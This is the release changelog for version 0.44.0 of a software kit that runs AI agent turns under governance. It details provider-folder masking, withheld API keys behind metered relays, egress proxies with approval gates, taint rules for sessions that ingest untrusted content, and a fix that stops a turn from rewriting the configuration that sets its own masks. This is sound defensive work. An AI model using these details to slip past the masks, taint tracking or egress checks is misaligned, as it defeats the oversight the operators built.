# @schlessera/brain-ui-sdk

## 0.44.0

### Minor Changes

- e1b8980: Bound unresolved roadblock waste at eligible later success and add the abandoned remedy. Breaking before 1.0, approved in #2034: the default actionable report now excludes abandoned episodes; use remedy=all to include them or a named remedy to filter explicitly over HTTP and query_activity. Historical stored evidence is preserved.
- c60f956: A hosted turn now sees the provider folders its governance policy allows for the provider that actually receives its inference (#2695). Until now every turn under a `providers` rule had those folders masked. The recipient is named only from the exact origin the turn's host inference relay forwards to, which runs for governed and strict Claude and pi turns on managed native storage. Built-in vendor origins name their vendor, for example `https://api.anthropic.com` is `anthropic` and pi's `openai-codex` is `openai`. The new server variable `BRAIN_UI_PROVIDER_RECIPIENT_ORIGINS` (`name=origin[,origin];...`) names a trusted gateway. Any other origin is unknown and sees no provider folder. That includes a custom base URL, an origin listed only in `BRAIN_UI_CLAUDE_OAUTH_ORIGINS` or `BRAIN_UI_PI_CREDENTIAL_ORIGINS`, routers, and Bedrock or Vertex.

  A turn allowed every provider folder sees them, `.git` and the real search index. A turn allowed some of them gets masks for the rest and a private index without their documents. The turn's relay then refuses any other origin.

  A conversation that showed folders to one recipient refuses a later turn, or a handoff, whose recipient may not see them, with `ProviderRecipientRefusedError`. That covers a pin that fell back to another profile, a changed route or a pi model change. A handoff summary is not drafted for such a conversation; write it by hand.

  `AgentBackend` gains optional `inferenceOrigin({ profileId, sessionId })`, which the Claude and pi backends implement. A backend without it keeps every provider folder masked.

- bddd0a4: Apply governance policy provider folders to autonomous turns (#2691). A restricted autonomous turn under a provider rule now reads each masked folder as empty and searches a private index built from the masked view, removed when the turn ends; its server-side brain tools refuse masked paths. Autonomous admission reads the same last-valid policy as hosted turns, translates path and type selectors onto folders the same way, and refuses every other selector by name.
- 603a754: Complete interactive share filing through session-bound authoritative receipts and verified original-file dispositions, with durable replay and recoverable cleanup.
- 4349af3: Retain successfully persisted external Claude auto-memory as attributed steering history with raw versions, taint evidence, authenticated review/revert and conflict-safe Undo. Interrupted or refused persistence remains explicitly incomplete.

  Keep expanded journal details within the viewport when long retained paths or unavailable-reason text is reviewed at 200% zoom.

- cf70a33: Retain Claude-generated session titles while attributing measured title-helper usage separately from main-conversation and cache diagnostics. Reconcile supported OTLP receipts within the existing cumulative accounting transaction so helper spend appears once, preserve unmatched usage as unattributed, and respect configured operator telemetry and opt-outs.
- 7eedceb: Add the experimental content-renderer client registry, independent server-safe static entry, and browser theme conformance harness for trusted bundled packs.
- 07bf0ee: Start host-owned background tasks during Gemini and GPT-Live conversations, with exact native result binding, ordinary typed-task permissions, honest recognition and durable no-replay outcomes. Pre-1.0 breaking conversation refs and statuses follow the recorded maintainer ruling.

  Reuse a single conversation owner across concurrent durable recovery, and terminate exactly bound native refusals while retaining no-replay tombstones so repeated refusals do not exhaust voice capacity.

- d2bb3b3: A hosted application (`brain_add`, `brain_update`, `brain_archive`, `write_file`, `edit_file`, `apply_staged_changes`) returns as soon as its Markdown is committed, instead of re-indexing the brain first (#2835). On a 2,000-note brain that wait was about 4 s per write. Breaking before 1.0, ruled on #2835: a successful result now reports `indexed: false` with the new `indexStatus: "pending"` while its index update is queued, and `indexed: true` only after an update completed. The Markdown write, its durability and its refusals are unchanged.

  The changed paths are batched and indexed in one targeted update, in the same isolated maintenance worker, at the next read that needs the index or at the end of the turn. Every such read waits for it: the brain's MCP tools, pi's `brain_search`, `brain_context`, `brain_read`, `brain_list` and `brain_graph`, the shell, `brain_add` planning, and the server's `/api/brain/search`, `/list`, `/stats`, `/briefing` and `/api/graph/*` routes. When the update fails, the read is refused with the committed paths and the error instead of returning stale results, `brain_add` refuses with `index_stale`, `/api/*` answers `503` with `code: "index_stale"`, and the paths stay queued for the next try. Activity records each outcome as a `brain_application_index` event after the application it follows.

  `BackendBridge` gains optional `awaitIndex(toolName)`, which the Claude and pi backends await before admitting every tool. `indexAll` in `@schlessera/brain/internal` accepts `paths` for a targeted run that leaves the index as a fresh build would. The standalone `brain add --json` keeps its synchronous `indexed`.

- 11239d6: Denied turns no longer read the committed generated-text caches (#2692). In a hosted or autonomous turn under a provider folder rule, `.context-cache.jsonl` and `.asset-cache.jsonl` read as empty, so cached chunk contexts and asset descriptions of masked documents stay hidden. A cache that is a link or has a second name refuses the launch.
- 8fc9663: BREAKING: retain recognized and generated live dialogue with its chat across reopening; draft Discard no longer erases archived discussion. Add negotiated bounded history paging with original source provenance and operational recovery, without native replay or automatic expiry.

  Preserve explicitly unsaved recognition/reply tails in observed order after real storage failure, and separate contextual correlated capture from bounded task/review caches.

  Separate saved and unsaved recognition groups, bound projection work per session, distinguish pending-write pressure from storage errors, and keep both contextual and reviewed-only archival capture independent of rolling review budgets.

  Integrate canonical reading/focus and stale-session recovery, qualify unsaved rows accessibly, preserve surviving source anchors during paging, and clear volatile evidence across principal replacement.

  Drain task-persistence failures against the exact failed epoch, reject missing-chat reads without inventing legacy history, and qualify unclosed voice history separately from incomplete backend position witnesses.

  Keep ordinary typed chats free of invented legacy-voice warnings, preserve true backend suffix offsets when voice starts mid-turn, and distinguish healthy active epochs from unclosed history after restart.

  Order same-conversation close/open transitions through device takeover and pending-open replacement, preserve owner-local observation drains, and avoid false interruption from other exact healthy live identities without hiding real failures.

  Preserve complete coverage for simultaneous healthy voice entries in one chat, fence and retire pending writer identities, and keep adopted sibling scopes aligned without masking no-close or restart gaps.

  Keep already admitted provisional voice scopes healthy when adoption precedes acknowledgement, without relaxing new-start admission or identity fences.

  Keep arbitrary remote close/storage diagnostic message text out of conversation state and UI; use fixed local reason/cause copy while preserving scoped storage recovery and continuous capture across review-cache rollover.

- 800d965: Keep the committed generated-text caches in their own `.brain-cache/` directory: `.context-cache.jsonl` becomes `.brain-cache/contexts.jsonl` and `.asset-cache.jsonl` becomes `.brain-cache/assets.jsonl`. Breaking before 1.0, ruled in #2692 (option B, delivered in #2725): the location of committed files changes. The line format and every CLI, MCP and HTTP shape are unchanged. An existing clone keeps every cached context and asset description: reads count the old root-level files, and the next index run (or `brain doctor --fix`, new check `legacy-caches`) moves every line into the new file and deletes the old one. The move is idempotent and keeps union-merged lines, and `brain sync` treats the old names as derived caches, so a merge with a clone that still writes them keeps both sides. The template ships the empty caches in `.brain-cache/` with `merge=union` for the new paths, and `brain doctor --fix` adds those lines to an existing brain. While a governance policy names provider folders, every governed writer retains `.brain-cache/` beside `.brain-index/`, a hosted or autonomous turn that masks any provider folder sees it as an empty read-only folder, and a turn allowed every provider folder sees the real caches. A root-level cache from an earlier release keeps its file mask on every turn under a provider rule. ui-server starts one index run at boot when such a file is present.
- aeaaf77: Pass each app's resolved exec wrapper through backend construction, runtime
  probes, Claude SDK workers and Pi tools. Explicit empty host configuration
  disables the optional wrapper; standalone callers omitting it retain the
  ambient fallback at the existing turn and tool-spawn boundaries.
  Pi workers see each configured helper file, and only that file, in ordinary and
  restricted views; a wrapper or killer that is not a regular file is refused
  before any relay or worker starts, as is a nonregular wrapper for an ordinary
  Claude worker.
- bde209b: Keep the disposable search index in its own `.brain-index/` directory: `brain.db`, its SQLite sidecars and the embedding lock move from the brain root to `.brain-index/brain.db`. Breaking before 1.0, ruled in #1668 (option B): a direct SQL reader opens the new path. The schema and every CLI, MCP and HTTP shape are unchanged. An existing brain migrates by rebuilding, never by moving: the first writable command creates the directory and `brain index` fills it. The old root-level files are ignored; `brain doctor` reports them as `legacy-index` and `--fix` deletes them. ui-server now requires a content CLI of at least 0.44.0, deletes the old root-level index at boot and starts one index run. While a governance policy names provider folders, every governed writer retains `.brain-index/` like a provider folder, and publication refuses to remove or replace it.
- 498a601: Let the owner read a private managed-worktree finding's details from its hygiene review card. The review read says per request whether this caller may read them, and `GET /api/hygiene/review/details/:itemId` returns the recorded owner, repository, revision, starting commit and changed paths to the owner principal only; every delegated agent and ambient principal is refused, and the replicated card stays opaque. `HygieneCard` gains a `details` slot, and the full card shows an inline Private details disclosure that fetches on opening and keeps the details in memory only.
- f3c6fdc: Acquire shared reference source through the native reference pool. Public source is resolved and fetched anonymously and shared across the host; private source needs a live owner-managed grant and stays with its principal. Only the network transport ever holds the granted credential, and checkout runs with no credential and no network. Authority validation and refresh keep separate request-only clocks (`BRAIN_UI_REFERENCE_VALIDATION_SECONDS`, `BRAIN_UI_REFERENCE_REFRESH_SECONDS`, five minutes each). A failed refresh returns the previous revision explicitly stale while its authority is still valid. At most `BRAIN_UI_REFERENCE_ACQUISITIONS` (two) operations run host-wide, and same-source requests join one. Capacity pressure evicts the least recently used source no reader holds. Revocation cancels and withdraws private source. `ServerConfig` gains optional `referenceSource`, and transport workers can run without network.
- 477c8f7: Add an optional, separately qualified reference pool volume to the host-only native storage manager. It charges actual unique Btrfs allocation against a configurable 10 GiB combined and 2 GiB per-operation allowance, enforces both with simple-quota kernel limits, shares physical backing headroom through a ledger, records durable intents through reclamation, and exposes `brain-native-store pool status|recovery|release` for operators. No acquisition, worktree or worker access is enabled yet.
- 62cb35c: Publish sealed reference-pool roots through per-domain view directories. `poolPublish` moves a sealed source root into its view once and swaps a plain name to it atomically, so a worker that binds the whole view reads a refreshed source on its next path read while open files keep their revision and staging never appears. `poolUnpublish` removes a name, `poolWithdraw` moves a root out of its view so it is unreachable by name or identity, releasing a root removes its names first, and `NativePoolRecord` gains `view`. The pool's `roots` and `views` directories join the mandatory worker masks.
- 1135899: Agents on both backends can read shared reference source and use managed worktrees. Two new bridge tools, `reference_source` and `reference_worktree` (`request`, `access`, `renew`, `release`, `list`), share one strict contract in `@schlessera/brain-ui-sdk/tool-contracts` and stay in every interactive session's fixed roster; a turn without a host handler refuses the call. The host binds principal, turn and worker generation itself, and a result reports a path only where this turn's workers can reach it. Governed and strict turns now bind the public and principal's private source views read-only under `/tmp/brain-reference/`; before each bind, every source whose validation lapsed is validated again, and one that fails is withheld until a request validates it, and the app enables worktree generations whenever a reference pool exists. The native manager gains `poolView`, which opens a view's directory before its first publication.
- d6a07c4: Give workers governed access to managed reference worktrees. A governed or strict turn's workers bind one root-owned worker generation at `/tmp/brain-worktrees`, and a worktree appears there only after the turn journal covers it. Its edits are journaled from the worktree's own checkpoints under scope `reference_worktree` with logical `reference-worktree://<id>/<path>` paths, count toward scope caps and are never reverted into the brain. The generation retires before the turn's final observation and parks its worktrees afterwards. The sandbox note gains fixed worktree guidance. Generations open only when worktree access is enabled by the supported tools, and acquired source is checked out group-writable.
- c89045b: Give the native reference pool managed-worktree storage. `poolCheckpoint` takes a read-only snapshot of a writable worktree, `poolDelta` streams metadata deltas between two checkpoints of one worktree, and `poolReadCheckpoint`, `poolStatCheckpoint` and `poolListCheckpoint` read them through the fixed worker-UID reader. Access generations (`poolAccessOpen`, `poolAccess`, `poolPark`, `poolAccessClose`) move a worktree into or out of one root-owned directory that a running worker binds whole, so a grant appears without a new mount. Pool records gain the `checkpoint` purpose and an `access` field, the pool's `access` directory joins the worker masks, and reclaimed checkpoint identities are forgotten.
- abf5b3e: Seed new live conversations from authorized prior chat text, retained spoken evidence and exactly joined completed host facts on both voice services. Add optional frozen history and actual selection coverage to the live API; preserve native binding fences, whole-item byte bounds and no effect replay. Disclose prior-text transfer and incomplete context on Start and re-entry.

  Breaking before 1.0: voice starts must echo the exact profile disclosed on explicit Start. Legacy clients sending an undisclosed start now receive a correlated refusal before any provider or chat-history work. New clients keep voice unavailable on older hosts without the public hello profile. Enter and Cancel transfer no prior chat text. This privacy admission correction is directed on #3178; ordinary same-entry recovery retains explicit Start consent only for an unchanged effective disclosure.

  Preserve pre-journal typed prefixes and exact assistant range positions when cross-stream order is unwitnessed; qualify ambiguous omissions conservatively. Live user text requires recorded source provenance; omit unproven legacy or host-generated user items whole with partial-context gaps, preserving native answers as historical data. Exact turn joins protect duplicate text and newest running questions across page/receipt eviction and restart. Actual provenance read errors or contradictory positive identities refuse startup. Add host-only causal newest references so omission qualifiers remain truthful.

- 85873db: Add the live conversation client with reviewed semantic commits, PCM capture and playback, lifecycle resync and continued ordinary chat progress and interaction. Add advertised resumable speech pause, opening-request correlation and independent agent-profile routing while preserving final stop and phase-1 dictation.
- 00a583b: Keep GPT-Live connected across missing input correlation IDs. Replace the prior close-on-missing behavior with bounded unassigned recognition carrying exact fragments and session intervals, separately reviewed without guessed input or native-work association. Add unassigned recognition/delegation events to the conversation contract. Explicit mismatches and permission guards remain enforced.
- 3f68a36: Propagate configured and runtime main-model identity into interactive and voice journal/governance attribution, preserving earlier unknown-model event snapshots and rejecting stale active-turn bindings.
- 5322d30: The turn journal records the brain's disposable search index by metadata only (#2873). `.brain-index/brain.db`, its `-wal`, `-shm` and `-journal` sidecars and an index publication copy keep their path, size and change stamp in history, so every refresh still shows as a change, but their bytes are no longer copied into retained objects. A governed turn's journal finish no longer copies a whole new index version after each automatic refresh.

  Breaking before 1.0, ruled on #2873: index versions were byte-retained, readable and restorable, and now are not. Their `JournalVersion` carries the new `metadataOnly: true` and an opaque change `stamp`, and no `hash` or symlink `target`; preview answers `reason: "metadata_only"`, raw download is 404, versions retained by earlier releases are presented the same way, and history revert and Undo exclude the index as `metadata_only` (including versions retained by earlier releases) and leave it to the following index refresh, without marking the operation partial. Rebuild the index with `brain index --force`. A metadata-only version is not a missing version and does not make a turn partial. The history reader lists these entries under "Search index · metadata only" with no review action. Every other path, including other names inside `.brain-index/`, keeps its exact retained bytes. Existing history rows are kept; the bytes earlier releases retained for them are purged (#2903).

- 69151ca: The `brain` CLI's paid providers work again in governed and strict turn workers, through a metered host relay, and the worker still holds no provider key (#1673). On a host with managed native storage, each such turn gets a relay beside its egress proxy. Gemini embeddings, Gemini completions without video, Anthropic completions, and OpenAI and Gemini images send their native requests to it. The server adds the key, records each request's usage on the turn, counts it toward the turn, conversation and day budgets, and refuses the next request with `budget_exceeded` once a budget is blocked. Nothing is reserved, so requests already in flight can take a budget slightly past its stop. `brain search` uses its vectors again instead of falling back to keyword results. The relay refuses streamed requests, caps how many requests and request bytes it holds at once, and replaces any copy of the key in a response with `[redacted]`. `brain video watch` and the `jev` reranker are not relayed and still report `provider_unavailable`.

  A relayed Claude API-key turn no longer breaks `anthropic-haiku`. The CLI used to send the turn's inference placeholder and fail authentication; it now reaches the host's `ANTHROPIC_API_KEY` through the relay.

  Credentialed maintenance (search from the UI, cron jobs, module actions) on those hosts also runs without `GEMINI_API_KEY`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY` or the brain's `.env*`, and uses its own relay. A run started from a turn's tool is charged to that turn; any other run counts toward the UTC day. Keys the relay does not carry, such as `TYPESAFE_API_KEY`, stay as before. Hosts without managed native storage are unchanged, and worker-host status says so.

  The budget receipt's `coverage` now reads "Built-in inference and relayed brain CLI providers; other provider and tool spend is not metered". Receipts stored earlier keep the old text, and the schema accepts both. Gemini embeddings are priced at Google's list price per input modality. Image requests stay unpriced, and their reported tokens count toward the unpriced-token stops.

  **Migration:** the relay sends a key only to its own first-party origin. If you point a built-in provider at a custom endpoint (`GOOGLE_GEMINI_BASE_URL`, `GEMINI_BASE_URL`, `OPENAI_BASE_URL`), or use a custom `apiKeyEnv`, list that key and exact origin in the new `BRAIN_UI_CLI_PROVIDER_ORIGINS`, for example `GEMINI_API_KEY=https://gateway.ithaca.invalid`. Until you do, the relay refuses those requests. Keys must be in the server's environment; a key kept only in the brain's `.env` no longer reaches relayed maintenance. A governed turn with an `allowlist` egress policy needs the provider's host on that allowlist.

- 046b6ae: Expose authoritative optional journal configuration coverage and its compact accessible disclosure badge. Keep changes ahead of complete, filterable coverage inventories, separate missing retained versions and ignored paths, and preserve inspection state on same-turn refreshes without changing counts, retention or authority.
- 5600c72: Add an internal, explicitly selected HTTP/CONNECT egress transport with private worker networking, destination and bounded-byte enforcement, outward approval and per-connection records. Ordinary backend activation remains gated on complete transport and native-authentication qualification; existing interactive network defaults are unchanged.
- caae12d: Add the supported metadata-only `@schlessera/brain/storage` host reader, which never executes Git or repository configuration, and human-only bounded Storage inventory and reference inspection, with explicit store ownership, deduplicated object and capacity observations, partial coverage, configured backup roots, and backend-owned transcript metadata. This foundation does not register a Storage pane or execute cleanup.

  Provide bounded cached subtree projections and server-side search/sorting for
  Storage charts and equivalent lists, with separate object-union area and subtotal
  evidence so aliases do not inflate a chart.

- 6099bdf: Record the first main request's cache-read/write counters and hash-only assembled
  prefix fingerprints for each conversation turn. Activity detail exposes suspected
  resumed cache breaks and changed components; runtime stats aggregate retained
  diagnostic evidence with explicit unknown coverage. Helper and child usage cannot
  replace the main receipt, and fingerprints do not claim provider cache hits.
- b9805a4: Allow a trusted host to supply an already-prepared turn egress proxy to the ordinary Claude turn runner, retaining native startup settings and checkpoint identity checks before host-held OAuth inference.
- d9f4405: Changed (breaking supported input, #2699): a hosted or autonomous turn whose governance policy has a `providers` rule with `types:` now reads the brain's taxonomy only from the policy's protected paths. The `brain config check` worker that translates a type into folder masks sees `brain.config.ts`, `node_modules`, `package.json` and the other protected paths, and nothing else of the brain. A configuration that imports a helper, loads a local module or runs a CLI script outside those paths no longer loads there, so every type selector refuses with `ProviderPolicyRefusedError`, naming the file it could not load. The same refusal follows when the taxonomy changes once only the protected paths are visible (the configuration reads or probes another file), when a governed turn created a protected name such as `brain.config.ts` and has not been reconciled, when the policy releases `brain.config.ts`, `brain.config.json`, `package.json`, `bun.lock` or `node_modules`, when the configured brain path is not canonical, and when the brain has no packaged CLI, since its `scripts/brain-cli.ts` fallback cannot start in the taxonomy worker. Previously those configurations translated, trusting code a governed turn could rewrite to decide which assets the masks hide. To keep translating, add every file the configuration loads or reads to the policy's `protect` list (for example `protect: [modules, lib/odysseus-types.ts]`). Configurations whose taxonomy loads only from protected paths, such as the template's, are unaffected.

  Added: `WorkerProviderMasks.visible`, the only brain paths a worker sees, each read-only over an empty brain.

- 918b34a: Enforce governance policy provider folders in hosted interactive and voice turns (#1668). No turn has a proven inference recipient yet, so a provider rule denies every turn: each `folder/**` root reads as an empty read-only directory, `.git` is hidden, and `.brain-index/` is a private, writable index the brain's own CLI builds before the turn from the masked view, so it never holds the masked documents. A provider rule that names a document type, a non-literal glob or a single path refuses turn admission by name instead of staying unenforced. `brain index` without `--embeddings` now runs where only `.brain-index/` is writable.
- caae12d: Add human-owner attachment review, journal-backed removal and version-checked Undo with durable per-item receipts. Originals are verified and retained before effects; changed, protected, ignored and uncovered files are refused. Interrupted requests never replay, replacements are never overwritten, and retention expiry removes the Undo offer. Add the bounded core primitives and protocol contracts used by this application boundary.

  Read-only attachment inspection exposes the same bounded current facts without consuming a durable operation identity; confirmation still requires a fresh review.

- f62ce30: Expose trusted build-time content-renderer pack registration and authenticated
  module renderer metadata. Missing bundled packs retain source with an explanatory
  note; development roots report known module version skew once.
- 965578d: Use completed response receipts for resumed Claude turns instead of the runtime's session-cumulative cost and model usage. Retain newly observed unstreamed usage separately and once in Activity and session totals, with explicit unknown attribution and partial coverage after missing history or counter rollback. Model identifiers retain their own counters across response snapshots and persisted reconciliation, including names that match inherited JavaScript properties.
- cb5db6e: Retain bounded completed host results across live conversation replacement and durable recovery for both voice engines.
- 790d593: Retain literal provider-policy folder topology in newly admitted governed workers and in native host publication. Shared writers inherit active peer folder plans across policy removal. Existing roots and ancestors resist rename or replacement while contents and permitted siblings stay writable. These primitives do not activate inference routing or establish complete protected-data isolation.
- 02c74a3: Provider-restricted governed turns now run when the worker has its own UID (#2696). Before the payload starts, the server checks the worker's mounted provider folders, masks and private index through a gated brain view from the identity helper. The helper protocol gains an additive `view` operation. A helper without it still refuses these turns before the payload starts.
- 8f7430c: A session that ingests untrusted content now runs under tighter rules for the rest of the session. WebFetch/WebSearch and pi web results, reads under `.brain-ui/inbox/` or `workspaces/`, results from any MCP server other than brain-kit's own, and fetching or unclassified Bash calls record the session's first `taint` governance event. While tainted, every outward action asks for approval even when `outward.allow` matches, and its `outward_action` event says `tainted: true`. On the turn egress proxy, any connection other than the inference relay also taints the session, and a tainted session's new connections reach only `taint.egress.allow` and hosts the session already contacted; refusals are `egress_denial` events with reason `taint_allowlist`. Turns without the proxy keep their network, and the capabilities note says tainted egress is not enforced there.
- b192ca0: Changed: the hosted server commits turn-journal, Activity and native-lease SQLite writes on a write worker thread at `synchronous=FULL`, in submission order; the event loop awaits each commit instead of blocking in its fsync (#2814).
  Changed (breaking for direct `TurnJournal` callers): journal writes that callers wait on (`bindSession`, `writeOperation`, Claude memory persistence, revert reservation, retained-version leases and retained streams) are asynchronous; `writeOperation` takes statements, and the journal exposes `ready` for its startup recovery.
  Added: `StartTurnRequest.persistClaudeMemory` may return a promise; the Claude backend awaits it before persisting the next note or ending the turn.
- 8822aed: Keep interactive tool schemas stable across posture, strict fallback and temporary host capability changes. Refuse unavailable calls before privileged handlers or approval cards, preserving voice and sandbox authority.
- 8476426: Render configured module fences through trusted static entries using the print theme in CLI and API exports. Failed or unsafe entries retain their code with diagnostics. CLI markdown embeds contained local SVG images for offline PDF/PNG rendering.
- caae12d: Keep bounded Recent, Daily and Weekly Storage observations, qualified seven-day and 30-day capacity scenarios and independent pressure causes. Retain warning and notification evidence across restart, use existing owner-authorized push subscriptions, and suppress ambiguous or restored delivery attempts.
- caae12d: Expose explicit owner-only Storage housekeeping with durable operation receipts,
  qualified before/after observations and bounded credential-free workers. Add
  non-destructive `brain storage pack --json`; retain scratch pins, inbox settlement,
  recovery evidence and existing retention policy across failures and cancellation.
- d6ad60a: Isolate damaged optional JSONL transcripts from healthy enumeration. Add explicit qualified-prefix diagnostics and version-bound recovery into a new writable Recovered session with durable provenance, preserving the quarantined original and making retries idempotent.
- 79bab30: A strict, voice or autonomous turn now sees its own applications in the same turn (#2848). Its worker reads a turn data tree at `/tmp/brain-worker-data`: the documents as the turn started plus every change the turn's host applications committed, with a search index the server brings up to date before the next search. `brain` commands in either shell, Claude's `brain` MCP server and pi's brain tools, `read_file`, `grep`, `brain_read` and shell use it as their data root, while `brain.config.ts`, modules and module settings still load from the frozen view at the brain path. A peer's change made during the turn does not enter it. Admission copies the startup documents into the tree and seeds its index (about 0.1-0.4 s on 2,000 notes).

  Claude's `Read`, `Grep` and `Glob`, and shell commands that name the brain path, still see the turn-start bytes. A Claude `Read` of a file the turn changed is refused and names `mcp__brain__brain_read`, which reads the current version.

  A provider-restricted turn's own applications now reach its private search index too (#2846), and no masked document does: a change enters only if its path is outside the masked folders, neither its result nor its base declares a type the recipient may not see, and its base is what the turn could already see, never a peer's. Such a turn's `brain_add` plans on its own data tree and index, in a masked worker. The private index is now read-only to the agent: `brain index` and `brain` CLI captures inside a masked turn fail, and the server keeps it current instead.

  Core maps a worker's `BRAIN_WORKER_CONFIG_ROOT` back to its `BRAIN_WORKER_DATA_ROOT` during root discovery, and readers there retry `SQLITE_READONLY_RECOVERY` and `SQLITE_BUSY_RECOVERY` a bounded number of times. `@schlessera/brain/module` exports `configurationRoot(root)`; jobs scoring reads `settings/jobs.json` and its criteria document through it. `BackendBridge.awaitIndex` takes the tool's input as an optional second argument.

- 086db5b: On hosts with managed native storage, run governed and strict Claude turns on their own turn egress proxy and the host inference relay by default. Every connection becomes a governance event, policy limits apply, and a connection to an outward host waits for approval unless the tool call in progress was classified as a read or an approved outward action to that host. The capabilities note states recorded egress only for a worker actually routed through the proxy. Elsewhere those turns keep their current network, and `runtime.workerHost.governed.egress` on `GET /api/status` says which applies.

  The relay forwards to the server-selected route (a profile's `baseUrl`, else `ANTHROPIC_BASE_URL`). A custom origin may receive the host's Claude login only when `BRAIN_UI_CLAUDE_OAUTH_ORIGINS` lists it exactly. **Migration:** if a subscription profile or `ANTHROPIC_BASE_URL` points Claude at a custom origin on a host with managed native storage, add that origin to `BRAIN_UI_CLAUDE_OAUTH_ORIGINS`, or those turns are refused before their prompt is sent.

  A model-discovery cache entry in the brain no longer supplies a profile's `baseUrl`, credential variable names, model aliases or tools; only the fields discovery itself writes are read back.

- 9b8239d: Record and show host turn lifecycle, admission and first-frame timing alongside unchanged backend-run durations.
- 9423920: Negotiate host permission outcomes in the client and add scoped voice refusals with an earcon and visual fallback when exact permission speech is unproven. Keep approval controls, original-input attribution, once-only cues, terminal and reconnect receipts tied to the host's actual result. Publish posture-denied outcomes without raising a grant card.
- 1faf79c: Governed and strict turn workers no longer receive the `brain` CLI's provider keys (#1666). A worker keeps only its own inference credential where the host does not relay it, plus any name an operator admits through `BRAIN_UI_SUBPROCESS_ENV_EXTRA`. `GEMINI_API_KEY`, `OPENAI_API_KEY`, `TYPESAFE_API_KEY` and the other provider credentials stay on the host. The brain's `.env*` files were already unreadable in these workers, and now there is a test for that.

  A `brain` command that needs a withheld key names the provider and the key, and falls back where it can. `brain search` returns keyword results, `brain index --embeddings` builds a keyword index, and an enabled `jev` reranker keeps lifecycle order. `brain process`, `brain image` and `brain video watch` refuse, because the built-in providers' own missing-key errors name a withheld key too. Each notice ends in a `[provider_unavailable …]` token. The worker learns which keys it lacks from the new `BRAIN_WITHHELD_KEYS` variable, which holds names only. The server records each token in a tool's result as a `provider_unavailable` governance event, at most 20 per turn. The capabilities note now says that secrets are hidden and names the keys a worker keeps.

  To keep the old behaviour for a key until the metered relays land (#1673), admit it explicitly with `BRAIN_UI_SUBPROCESS_ENV_EXTRA`. Outside a worker, a brain without keys behaves as before.

- 7d1a31d: Run qualified workers under a distinct host identity with authenticated supervision, retained bounded mounts and cancellable private-file recovery.

### Patch Changes

- 1f032f9: A separate-UID worker's identity broker is now closed off the event loop on the asynchronous probe and on a failed asynchronous launch, together with its fallback cleanup and the governed launch's brain-view requests. The hosted server no longer stalls `/api/health` and WebSocket pings while the broker's control client runs on those paths. The synchronous forms are unchanged.
- 2d21e91: A separate-UID worker's identity broker is now also closed off the event loop after an asynchronous launch has returned: when a turn releases the worker's last runtime-state or turn-temp handle, when the worker exits holding none, and after a failed supervision. The hosted server no longer stalls `/api/health` and WebSocket pings at the end of such a turn. Both backends await the close before they release the turn's storage reservation. A close the supervisor cannot confirm keeps the reservation charged and can be retried, and a worker's exit holding no handle now reports that refusal instead of dropping it. The synchronous launch is unchanged.
- 2fe4005: Keep the hosted server answering while a worker's pipes are created and while a Claude turn prepares its own sandbox. The asynchronous worker probe, agent launch and maintenance launch and run now await `mkfifo` for their stdio and status channels instead of blocking on it, and a Claude turn whose host supplies no worker sandbox awaits its scratch area's git check before building its options. The synchronous forms, the FIFO modes, the unlink-before-launch boundary, the resolved sandbox and every refusal are unchanged.
- caae12d: Revalidate Storage maintenance authority after asynchronous worker preparation
  and record command entry only when preparation and authorization succeed.
- 3b3485e: A Claude turn now settles only after its session's native file observation saves have. A new session's first save is still queued without blocking the stream, but the turn's cleanup waits for it, so nothing is still writing host observation storage once the turn has returned. `NativeFileVersions` on the internal entry gains `settled()`.
- b63276f: Non-envelope Claude workers no longer import operator shell startup configuration (#2984). Their HOME is a fresh, empty, read-only mount, separate from the writable runtime-state tmpfs at CLAUDE_CONFIG_DIR. This covers successful shell snapshots and the CLI's login-shell fallback. Writes to `~/.npm`, `~/go`, `~/.cargo` and other HOME paths still fail with EROFS; they cannot consume transcript/credential storage or be misreported as runtime-state exhaustion. Credentials and config are resolved from the original environment before the HOME override and retain their existing preparation and persistence. The original host home stays read-only at its original path with the same profile masks; per-turn XDG storage and restricted-envelope behavior are unchanged.

  Rc-file masking was measured first with the real CLI. It preserves implicit Git config reads for fixed existing files, but a read-only bind remains a live view: a previously absent profile created by the host after enumeration leaks into both the snapshot and login fallback. Binding over the absent path up front fails with EROFS, and a startup symlink can redirect the mask onto another config file. The maintainer's empty-HOME fallback is therefore retained. Image-owned system startup files remain out of scope.

  Commands that found operator configuration through `~`, including `~/.gitconfig`, `~/.npmrc` and `~/.netrc`, must use an explicit path where the profile exposes it. Core's default `~/.local/bin` and geo's default cache/admission paths now resolve under the empty read-only HOME. Existing operator-home geo caches are no longer found implicitly; a geo cache miss refuses before any request, and no private per-worker admission state is created. Use the existing explicit configuration/environment facilities for other home-derived paths.

  Non-envelope launches also discard `BASH_ENV`, `ENV`, `ZDOTDIR`, `SHELLOPTS`, `BASHOPTS` and exported `BASH_FUNC_*%%` functions, including explicitly admitted values. Tools and variables previously supplied by a shell profile must come from the server's configured PATH and admitted environment. RTK continues to exclude the original host home when runtime HOME differs. The sandbox note describes Claude's empty read-only HOME, pi's original read-only HOME and the real host home's profile masks.

- fb219e0: Keep shared originals durably in their authenticated account until dismissal or
  complete server intake. Recover review and prior confirmation after reload or
  same-account authentication, coordinate tab ownership with native browser locks,
  and include retained shares in intentional sign-out cleanup.
- 39d16cb: Route Git's SSH transport through the turn proxy in egress workers: the worker bootstrap sets a first-party CONNECT helper as Git's `ProxyCommand` unless the caller chose `GIT_SSH_COMMAND`.
- 0316ccf: Apply egress approval requirements to configured outward hosts, preserving destination restrictions and shared byte limits for other traffic.
- 1977f52: Finalize active HTTP and CONNECT egress records synchronously and exactly once when a turn stops, so cleanup can observe audit failures before publishing its terminal outcome.
- d3a49c1: Report a native identity inspector's broken stdin pipe as unavailable after joining its retirement. Cancellation keeps its existing unknown outcome, and the next request starts one replacement without replaying the failed inspection.
- 498270f: Record bounded maintenance mask preparation failure phases without exposing input or error text, while preserving existing refusal behavior.
- 8351c98: Changed: the hosted server commits governance events raised outside a journal transaction, the session's first taint, roadblock records and turn scope rows on its SQLite write worker at `synchronous=FULL`, in submission order with journal and Activity writes, instead of on the event loop (#2850). A turn's egress connection sends its first byte only after its taint has committed, and admission counts that taint from the moment it is submitted.
  Changed: the egress proxy awaits a promise returned from its `admitted` hook before the connection's first upstream byte.
- 9a3af9b: Resolve inference credentials per dispatch and serialize host OAuth access with credentialed maintenance through a crash-safe kernel lock.
- 4ba50d8: Keep host GitHub credentials, including the skills installer token, out of maintenance and agent workers. Share the credential names across environment boundaries while preserving the mirror transport and skills installer's dedicated tokens and generic fallback.
